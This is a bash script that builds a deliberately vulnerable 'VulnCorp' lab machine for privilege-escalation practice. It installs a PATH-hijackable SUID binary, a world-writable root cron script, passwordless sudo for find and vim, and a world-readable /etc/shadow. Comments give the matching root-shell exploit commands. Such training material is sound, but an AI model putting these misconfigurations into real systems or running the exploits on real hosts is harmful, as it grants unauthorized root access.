#!/bin/bash
# ================================================================
# Privilege Escalation Setup Script
# ================================================================
# Sets up three independent privesc paths:
#   1. SUID binary (PATH hijack / tar wildcard)
#   2. Writable cron job running as root
#   3. Sudo misconfiguration (find as root)
# ================================================================

set -e

echo "[+] Setting up privilege escalation vectors..."

# ─────────────────────────────────────────────────────────────────
# PRIVESC PATH 1: Vulnerable SUID Binary
# ─────────────────────────────────────────────────────────────────
# This C program calls "tar" without an absolute path.
# Exploit: Create a malicious "tar" binary in a writable PATH dir
#   1. echo '#!/bin/bash\n/bin/bash -p' > /tmp/tar
#   2. chmod +x /tmp/tar
#   3. export PATH=/tmp:$PATH
#   4. /usr/local/bin/vuln-backup
#   → drops into root shell because of SUID + PATH hijack

cat > /tmp/vuln-backup.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // Intentionally calls 'tar' without full path — vulnerable to PATH hijack
    printf("[*] VulnCorp Backup Utility v1.0\n");
    printf("[*] Creating backup archive...\n");
    setuid(0);
    setgid(0);
    system("tar czf /tmp/backup.tar.gz /opt/vulncorp/app/ 2>/dev/null");
    printf("[+] Backup complete: /tmp/backup.tar.gz\n");
    return 0;
}
CEOF

gcc /tmp/vuln-backup.c -o /usr/local/bin/vuln-backup
chmod u+s /usr/local/bin/vuln-backup   # Set SUID bit
chmod 4755 /usr/local/bin/vuln-backup
rm /tmp/vuln-backup.c

echo "[+] SUID binary installed at /usr/local/bin/vuln-backup"


# ─────────────────────────────────────────────────────────────────
# PRIVESC PATH 2: Writable Cron Job Running as Root
# ─────────────────────────────────────────────────────────────────
# A script in /opt/scripts/ is executed by root via cron every minute.
# The script is WORLD-WRITABLE — attacker can inject commands.
# Exploit:
#   echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
#   Wait 1 minute, then: /tmp/rootbash -p

mkdir -p /opt/scripts

cat > /opt/scripts/cleanup.sh << 'SEOF'
#!/bin/bash
# VulnCorp Cleanup Script — runs every minute via cron
# Cleans up temporary files from the upload directory
find /opt/vulncorp/app/uploads -name "*.tmp" -mmin +60 -delete 2>/dev/null
find /tmp -name "*.log" -mmin +120 -delete 2>/dev/null
echo "[$(date)] Cleanup complete" >> /var/log/vulncorp-cleanup.log
SEOF

chmod 777 /opt/scripts/cleanup.sh   # WORLD-WRITABLE — intentional vuln
chown root:root /opt/scripts/cleanup.sh

# Add to root's crontab
echo "* * * * * /bin/bash /opt/scripts/cleanup.sh" > /etc/cron.d/vulncorp-cleanup
chmod 644 /etc/cron.d/vulncorp-cleanup

echo "[+] Writable cron script at /opt/scripts/cleanup.sh (runs every minute as root)"


# ─────────────────────────────────────────────────────────────────
# PRIVESC PATH 3: Sudo Misconfiguration
# ─────────────────────────────────────────────────────────────────
# The 'webuser' can run /usr/bin/find as root without a password.
# Exploit (GTFOBins):
#   sudo /usr/bin/find /tmp -exec /bin/bash \;
#
# The 'backup' user can run /usr/bin/vim as root.
# Exploit (GTFOBins):
#   sudo /usr/bin/vim -c ':!/bin/bash'

echo "webuser ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers
echo "backup  ALL=(root) NOPASSWD: /usr/bin/vim"  >> /etc/sudoers

echo "[+] Sudo misconfiguration applied (webuser→find, backup→vim)"


# ─────────────────────────────────────────────────────────────────
# BONUS: Weak /etc/shadow permissions
# ─────────────────────────────────────────────────────────────────
# Shadow file is world-readable — passwords can be cracked offline
chmod 644 /etc/shadow

echo "[+] /etc/shadow set to world-readable"


# ─────────────────────────────────────────────────────────────────
# BONUS: History file with sensitive commands
# ─────────────────────────────────────────────────────────────────
cat > /home/webuser/.bash_history << 'HEOF'
ls -la
cd /opt/vulncorp
python3 app/app.py
cat /opt/vulncorp/db/vulncorp.db
mysql -h 192.168.56.102 -u root -ptoor_mysql@prod
ssh sysadmin@192.168.56.102
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /opt/scripts/
HEOF
chown webuser:webuser /home/webuser/.bash_history

echo "[+] Privilege escalation setup complete!"
